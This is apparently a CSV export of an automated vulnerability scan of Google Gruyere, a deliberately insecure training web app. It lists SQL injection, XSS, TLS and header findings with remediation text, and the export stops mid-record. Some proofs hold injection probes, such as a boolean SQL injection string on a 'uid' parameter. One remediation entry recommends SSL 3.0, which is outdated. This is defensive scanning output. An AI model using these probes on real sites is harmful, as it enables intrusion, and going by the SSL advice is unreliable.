"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",6.1,"CVSS2#AV:N/AC:H/Au:N/C:C/I:P/A:N",6.5,"CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:L/A:N","The remote server offers deprecated TLS 1.0 protocol which can lead to weaknesses.",SSL/TLS,112496,"TLS 1.0 Weak Protocol",,2018-10-03T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A9], owasp_2013=[A6], owasp_2017=[A3], owasp_2021=[A2], cwe=[327], cve=[], cpe=[], wasc=[Insufficient Transport Layer Protection], bid=[]","https://security.googleblog.com/2018/10/modernizing-transport-security.html, https://webkit.org/blog/8462/deprecation-of-legacy-tls-1-0-and-1-1-versions/, https://blog.mozilla.org/security/2018/10/15/removing-old-versions-of-tls/, https://blogs.windows.com/msedgedev/2018/10/15/modernizing-tls-edge-ie11/",Medium,"Reconfigure the affected application, if possible to avoid the use of deprecated TLS 1.0 protocol.",,"3a044b53-4f3c-4be6-900b-27603ea7d1be",2022-03-15T18:42:41.743Z,2022-03-15T16:46:08Z,"
    Protocol   Supported
    ---------------------
    TLS 1.0    Yes",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",7.5,"CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P",7.3,"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L","Due to the requirement for dynamic content of today's web applications, many rely on a database backend to store data that will be called upon and processed by the web application (or other programs). Web applications retrieve data from the database by using Structured Query Language (SQL) queries.

To meet demands of many developers, database servers (such as MSSQL, MySQL, Oracle etc.) have additional built-in functionality that can allow extensive control of the database and interaction with the host operating system itself.

An SQL injection occurs when a value originating from the client's request is used within a SQL query without prior sanitisation. This could allow cyber-criminals to execute arbitrary SQL code and steal data or use the additional functionality of the database server to take control of more server components.

The successful exploitation of a SQL injection can be devastating to an organisation and is one of the most commonly exploited web application vulnerabilities.

This injection was detected as scanner was able to inject specific SQL queries, that if vulnerable, result in the responses for each injection being different. This is known as a blind SQL injection vulnerability.",Injection,98117,"Blind SQL Injection (differential analysis)",,2017-03-31T00:00:00Z,2022-05-25T00:00:00Z,"owasp_api_2019=[API8], owasp_2010=[A1], owasp_2013=[A1], owasp_2017=[A1], owasp_2021=[A3], cwe=[89], cve=[], cpe=[], wasc=[SQL Injection], bid=[]","https://www.owasp.org/index.php/Blind_SQL_Injection, http://projects.webappsec.org/w/page/13246963/SQL%20Injection, http://www.w3schools.com/sql/sql_injection.asp",High,"The only proven method to prevent against SQL injection attacks while still maintaining full application functionality is to use parameterized queries (also known as prepared statements). When utilising this method of querying the database, any value supplied by the client will be handled as a string value rather than part of the SQL query.
Additionally, when utilising parameterized queries, the database engine will automatically check to make sure the string being used matches that of the column. For example, the database engine will check that the user supplied input is an integer if the database column is configured to contain integers.",,"3c13c14b-02e5-471f-b914-71f47524167c",2022-03-15T21:06:17.432Z,2022-03-15T18:34:44Z,"Vulnerability has been detected on URL 'https://google-gruyere.appspot.com/563265819128830739647592760263700851280/saveprofile' by exploiting 'link' element named 'uid' and injecting following payload:

 | -1839"" or ""1839""=""1839

To confirm the presence of the vulnerability, this proof has been identified in the target response:

 | -1839"" or ""1839""=""1839 for TRUE statement and -1839"" or ""1""=""2 for FALSE statement

The information used to check the vulnerability have been provided in attachment.",NONE,High,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into HTML element content.","Cross Site Scripting",98104,"Cross-Site Scripting (XSS)",,2017-03-31T00:00:00Z,2022-06-23T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"3cd19066-8e27-4ff9-b0d5-4d7e8226d5f1",2022-03-15T21:06:17.432Z,2022-03-15T16:25:35Z,"The scanner was able to exploit a Cross-Site Scripting by injecting a custom payload and getting a javascript code execution.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",2.6,"CVSS2#AV:N/AC:H/Au:N/C:P/I:N/A:N",3.1,"CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N","The HTTP 'X-Content-Type-Options' response header prevents the browser from MIME-sniffing a response away from the declared content-type.

The server did not return a correct 'X-Content-Type-Options' header, which means that this website could be at risk of a Cross-Site Scripting (XSS) attack.","HTTP Security Header",112529,"Missing 'X-Content-Type-Options' Header",,2018-11-28T00:00:00Z,2022-05-04T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A6], owasp_2013=[A5], owasp_2017=[A6], owasp_2021=[], cwe=[693], cve=[], cpe=[], wasc=[Application Misconfiguration], bid=[]","https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options, https://www.owasp.org/index.php/OWASP_Secure_Headers_Project#xcto",Low,"Configure your web server to include an 'X-Content-Type-Options' header with a value of 'nosniff'.",,"3e10108f-04e5-4c55-a3ca-3fdc0475d2b1",2022-03-15T18:42:41.743Z,2022-03-15T16:44:46Z,"The scanner detected the lack of X-Content-Type-Options header in the target application response.",NONE,Low,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into the requested PATH and have it returned in the server's response. For example `HTTP://yoursite.com/INJECTION_HERE/`, where `INJECTION_HERE` represents the location where the scanner payload was injected.","Cross Site Scripting",98107,"Cross-Site Scripting (XSS) in path",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"4078f38e-ee0a-4691-9b40-91c3fbbc80c8",2022-03-15T18:42:41.743Z,2022-03-15T18:02:19Z,"Vulnerability has been detected on URL 'http://google-gruyere.appspot.com/425575187579520270957883614548769509881/feed.gtl' by exploiting 'path' element named 'xss_path' and injecting following payload:

 | <my_tag_798cc6ee-419f-40b1-b710-59cb8e5c7325/>

To confirm the presence of the vulnerability, this proof has been identified in the target response:

 | <my_tag_798cc6ee-419f-40b1-b710-59cb8e5c7325/>

The information used to check the vulnerability have been provided in attachment.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.0,"CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N",5.3,"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N","The HTTP protocol by itself is clear text, meaning that any data that is transmitted via HTTP can be captured and the contents viewed.

To keep data private, and prevent it from being intercepted, HTTP is often tunnelled through either Secure Sockets Layer (SSL), or Transport Layer Security (TLS). When either of these encryption standards are used it is referred to as HTTPS.

Cyber-criminals will often attempt to compromise credentials passed from the client to the server using HTTP. This can be conducted via various different Man-in-The-Middle (MiTM) attacks or through network packet captures.

Scanner discovered that the affected page contains a `password` input, however, the value of the field is not sent to the server utilising HTTPS. Therefore it is possible that any submitted credential may become compromised.","Authentication & Session",98082,"Unencrypted Password Form",,2017-03-31T00:00:00Z,2022-03-03T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A9], owasp_2013=[A6], owasp_2017=[A3], owasp_2021=[A2], cwe=[319, 523], cve=[], cpe=[], wasc=[Insufficient Transport Layer Protection], bid=[]","http://www.owasp.org/index.php/Top_10_2010-A9-Insufficient_Transport_Layer_Protection",Medium,"The affected site should be secured utilising the latest and most secure encryption protocols. These include SSL version 3.0 and TLS version 1.2. While TLS 1.2 is the latest and the most preferred protocol, not all browsers will support this encryption method. Therefore, the more common SSL is included. Older protocols such as SSL version 2, and weak ciphers (< 128 bit) should also be disabled.",,"41f3f249-9bc9-4866-844d-9e57eb94101d",2022-03-15T18:42:41.743Z,2022-03-15T16:54:38Z,"The scanner detected the presence of a form containing a password field which is transmitted to the target application without using an encrypted channel (HTTPS).",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"An error or warning message has been found on the remote web server. It may be possible for an attacker to view sensitive information and conduct further attacks.","Data Exposure",98611,"Error Message",,2019-05-26T00:00:00Z,2019-05-26T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]","https://www.owasp.org/index.php/Error_Handling",Info,"Disable all notice, warning and error displaying. Configure the application to log such messages in a file.",,"44dcdf94-1c94-4bf6-bab3-8701f4081a2a",2022-03-15T18:42:41.743Z,2022-03-15T17:38:48Z,"On http://google-gruyere.appspot.com/361357029172560933265350706939995878846/editprofile.gtl debug error messages were detected. Please see the attached response for full details.
<b>WARNING: Gruyere is not secure.",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"An error or warning message has been found on the remote web server. It may be possible for an attacker to view sensitive information and conduct further attacks.","Data Exposure",98611,"Error Message",,2019-05-26T00:00:00Z,2019-05-26T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]","https://www.owasp.org/index.php/Error_Handling",Info,"Disable all notice, warning and error displaying. Configure the application to log such messages in a file.",,"4671168e-8779-4a76-8b3a-31c06034bff2",2022-03-15T21:06:17.432Z,2022-03-15T19:01:48Z,"On http://google-gruyere.appspot.com/563265819128830739647592760263700851280/editprofile.gtl debug error messages were detected. Please see the attached response for full details.
<b>WARNING: Gruyere is not secure.",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"Publishes the sitemap of the web application as seen by the scan.

The list of all URLs that have been detected during the scan are available as an attachment. For each URL in the sitemap, the following information is provided:

- The first time the URL is detected - The logic used to detect the URL. This information may be found by: crawling rendering the page by a specific plugin - The parent URL requested to detect the URL - If the URL has been requested at least once, information about the response - Whether or not the URL has been queued for audit - If the URL has not been queued for audit, the reason why the URL does not need an audit - Whether or not the URL has been effectively audited - If the URL has not been effectively audited, the reason that the scanner was unable to audit the URL


Reasons for not adding a URL to the audit queue are as follows:

- not_in_domain: The domain of the URL does not match main target URL - scope_configuration: The URL does not match scope include list scan settings - directory_depth: The number of directories in the URL path exceeds the scan configuration setting - exclude_file_extension: The URL file extension matched one entry of the file extension blacklist setting - exclude_path_patterns: The URL matched one entry of the URL exclusion blacklist setting - redundant_path: The number of URLs to be audited with the same path and query string parameters has been reached - request_redirect_limit: The number of HTTP redirects allowed per scan configuration setting has been reached - queue_full: The number of URLs to audit has been reached


If a scan fails to audit a URL that has been queued for audit, reasons for the failure are as follows:

- timeout: The request timed out when trying to retrieve URL contents - filesize_exceeded: URL response exceeded file size limit defined in the scan configuration - scan_timelimit_reached: The URL couldn’t be audited before the scan time limit - user_abort: The user stopped the scan before the URL could be audited",General,98009,"Web Application Sitemap",,2017-03-31T00:00:00Z,2020-11-03T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]",,Info,,,"46e8e762-4e3c-4ba4-a2f5-80e1f28cc499",2022-03-15T18:42:41.743Z,2022-03-15T18:42:40Z,"The scan has discovered 214 distinct URLs.

The following is a breakdown of which URLs were audited:

- 45 effectively audited
- 32 not audited due to the scan time limit being reached
- 90 not queued due to the URL containing a fragment which is a feature of browsers and not included in HTTP requests. The page being referred to by the fragment shall still be audited by the scanner.
- 26 not queued due to the URL not being in the target domain
- 20 not queued due to file extension exclusions
- 1 not queued due to path pattern exclusions

For URLs we received responses for, here is a distribution of the content type headers:

- 2 application/javascript
- 2 image/gif
- 12 image/png
- 2 text/css
- 10 text/html
- 39 text/html; charset=utf-8
- 1 text/javascript
- 1 text/javascript; charset=utf-8

Response times ranged between 0.033914s and 0.326193s.

You can access the complete list of URLs with the information collected by the scan as an attachment to this plugin.",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"The scanner identified some responses with a status code other than the usual 200 (OK), 301 (Moved Permanently), 302 (Found) and 404 (Not Found) codes. These codes can provide useful insights into the behavior of the web application and identify any unexpected responses to be addressed.","Web Applications",98050,"Interesting response",,2017-03-31T00:00:00Z,2021-06-14T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]","http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html, https://en.wikipedia.org/wiki/List_of_HTTP_status_codes",Info,,,"47d71284-c8f0-45ff-b203-ba6e149139b8",2022-03-15T21:06:17.432Z,2022-03-15T15:46:10Z,"A response has been received with a response code '304' which may require further investigation to verify if this response is due to an abnormal behavior of the target.

The response has been triggered by an HTTP GET request made on the URL 'https://google-gruyere.appspot.com/static/codeindex.html'.",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Unlike traditional Cross-Site Scripting (XSS), where the client is able to inject scripts into a request and have the server return the script to the client, DOM XSS does not require that a request be sent to the server and may be abused entirely within the loaded page.

This occurs when elements of the DOM (known as the sources) are able to be manipulated to contain untrusted data, which the client-side scripts (known as the sinks) use or execute an unsafe way.

Scanner has discovered that by inserting an HTML element into the page's DOM inputs (sources), it was possible to then have the HTML element rendered as part of the page by the sink.","Cross Site Scripting",98109,"DOM-based Cross-Site Scripting (XSS)",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/DOM_Based_XSS, https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet",Medium,"Client-side document rewriting, redirection, or other sensitive action, using untrusted data, should be avoided wherever possible, as these may not be inspected by server side filtering.
To remedy DOM XSS vulnerabilities where these sensitive document actions must be used, it is essential to:
1. Ensure any untrusted data is treated as text, as opposed to being interpreted as code or mark-up within the page. 2. Escape untrusted data prior to being used within the page. Escaping methods will vary depending on where the untrusted data is being used. (See references for details.) 3. Use `document.createElement`, `element.setAttribute`, `element.appendChild`, etc. to build dynamic interfaces as opposed to HTML rendering methods such as `document.write`, `document.writeIn`, `element.innerHTML`, or `element.outerHTML `etc.",,"4b39de71-7048-4d69-a95f-d012ff846b44",2022-03-15T21:06:17.432Z,2022-03-15T19:20:25Z,"Vulnerability has been detected on URL 'https://google-gruyere.appspot.com/563265819128830739647592760263700851280/saveprofile' by exploiting 'link' element named 'action' and injecting following payload:

 | window.top._tenable_wasscan_js_namespace_taint_tracer.log_execution_flow_sink()",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert content directly into an HTML tag. For example `<INJECTION_HERE href=.......etc>` where `INJECTION_HERE` represents the location where the scanner payload was detected.","Cross Site Scripting",98105,"Cross-Site Scripting (XSS) in HTML tag",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"4c92fa1e-c7ff-48ea-9ee8-ca5838cd8f91",2022-03-15T21:06:17.432Z,2022-03-15T13:35:28Z,"Vulnerability has been detected on URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/snippets.gtl' by exploiting 'link' element named 'uid' and injecting following payload:

 | ' tenable_wasscan_xss_in_tag='c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd' blah='

To confirm the presence of the vulnerability, this proof has been identified in the target response:

 | ' tenable_wasscan_xss_in_tag='c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd' blah='

The information used to check the vulnerability have been provided in attachment.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into HTML element content.","Cross Site Scripting",98104,"Cross-Site Scripting (XSS)",,2017-03-31T00:00:00Z,2022-06-23T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"4de6854d-7dc5-49dc-8060-1956380c4533",2022-03-15T21:06:17.432Z,2022-03-15T17:14:24Z,"The scanner was able to exploit a Cross-Site Scripting by injecting a custom payload and getting a javascript code execution.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.0,"CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N",5.3,"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N","The HTTP protocol by itself is clear text, meaning that any data that is transmitted via HTTP can be captured and the contents viewed.

To keep data private, and prevent it from being intercepted, HTTP is often tunnelled through either Secure Sockets Layer (SSL), or Transport Layer Security (TLS). When either of these encryption standards are used it is referred to as HTTPS.

Cyber-criminals will often attempt to compromise credentials passed from the client to the server using HTTP. This can be conducted via various different Man-in-The-Middle (MiTM) attacks or through network packet captures.

Scanner discovered that the affected page contains a `password` input, however, the value of the field is not sent to the server utilising HTTPS. Therefore it is possible that any submitted credential may become compromised.","Authentication & Session",98082,"Unencrypted Password Form",,2017-03-31T00:00:00Z,2022-03-03T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A9], owasp_2013=[A6], owasp_2017=[A3], owasp_2021=[A2], cwe=[319, 523], cve=[], cpe=[], wasc=[Insufficient Transport Layer Protection], bid=[]","http://www.owasp.org/index.php/Top_10_2010-A9-Insufficient_Transport_Layer_Protection",Medium,"The affected site should be secured utilising the latest and most secure encryption protocols. These include SSL version 3.0 and TLS version 1.2. While TLS 1.2 is the latest and the most preferred protocol, not all browsers will support this encryption method. Therefore, the more common SSL is included. Older protocols such as SSL version 2, and weak ciphers (< 128 bit) should also be disabled.",,"4e5776ed-1210-4af1-99ca-bb269816ab95",2022-03-15T21:06:17.432Z,2022-03-15T15:34:35Z,"The scanner detected the presence of a form containing a password field which is transmitted to the target application without using an encrypted channel (HTTPS).",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.0,"CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N",5.3,"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N","The HTTP protocol by itself is clear text, meaning that any data that is transmitted via HTTP can be captured and the contents viewed.

To keep data private, and prevent it from being intercepted, HTTP is often tunnelled through either Secure Sockets Layer (SSL), or Transport Layer Security (TLS). When either of these encryption standards are used it is referred to as HTTPS.

Cyber-criminals will often attempt to compromise credentials passed from the client to the server using HTTP. This can be conducted via various different Man-in-The-Middle (MiTM) attacks or through network packet captures.

Scanner discovered that the affected page contains a `password` input, however, the value of the field is not sent to the server utilising HTTPS. Therefore it is possible that any submitted credential may become compromised.","Authentication & Session",98082,"Unencrypted Password Form",,2017-03-31T00:00:00Z,2022-03-03T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A9], owasp_2013=[A6], owasp_2017=[A3], owasp_2021=[A2], cwe=[319, 523], cve=[], cpe=[], wasc=[Insufficient Transport Layer Protection], bid=[]","http://www.owasp.org/index.php/Top_10_2010-A9-Insufficient_Transport_Layer_Protection",Medium,"The affected site should be secured utilising the latest and most secure encryption protocols. These include SSL version 3.0 and TLS version 1.2. While TLS 1.2 is the latest and the most preferred protocol, not all browsers will support this encryption method. Therefore, the more common SSL is included. Older protocols such as SSL version 2, and weak ciphers (< 128 bit) should also be disabled.",,"4f5325ed-77b6-4d49-be1a-20f3f13a5391",2022-03-15T18:42:41.743Z,2022-03-15T16:49:31Z,"The scanner detected the presence of a form containing a password field which is transmitted to the target application without using an encrypted channel (HTTPS).",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"The remote server presents an SSL/TLS certificate with wildcard entries. The use of a wildcard character in a entry permits a certificate to cover a number of subdomains of a domain.",SSL/TLS,113045,"SSL/TLS Certificate Contains Wildcard Entries",,2021-11-10T00:00:00Z,2021-11-10T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]",,Info,,,"514c12bc-87aa-4ce5-82c9-2c860abda4d0",2022-03-15T18:42:41.743Z,2022-03-15T16:45:34Z,"A wildcard symbol (*) has been detected in the following certificate entries:
Certificate Common Name: *.appspot.com
Certificate Subject Alternative Names:
- *.appspot.com
- *.de.r.appspot.com
- *.df.r.appspot.com
- *.an.r.appspot.com
- *.dt.r.appspot.com
- *.du.r.appspot.com
- *.el.r.appspot.com
- *.as.r.appspot.com
- *.et.r.appspot.com
- *.ts.r.appspot.com
- *.lz.r.appspot.com
- *.ew.r.appspot.com
- *.nw.r.appspot.com
- *.ey.r.appspot.com
- *.ez.r.appspot.com
- *.nz.r.appspot.com
- *.oa.r.appspot.com
- *.nn.r.appspot.com
- *.rj.r.appspot.com
- *.uc.r.appspot.com
- *.tz.r.appspot.com
- *.ue.r.appspot.com
- *.uk.r.appspot.com
- *.uw.r.appspot.com
- *.wl.r.appspot.com
- *.wm.r.appspot.com
- *.wn.r.appspot.com
- *.lm.r.appspot.com
- *.em.r.appspot.com
- *.km.r.appspot.com
- *.pd.r.appspot.com
- *.ui.r.appspot.com
- *.thinkwithgoogle.com
- *.thinkwithgoogle.goog
- *.withgoogle.com
- *.withyoutube.com
- *.app.google
",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into the requested PATH and have it returned in the server's response. For example `HTTP://yoursite.com/INJECTION_HERE/`, where `INJECTION_HERE` represents the location where the scanner payload was injected.","Cross Site Scripting",98107,"Cross-Site Scripting (XSS) in path",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
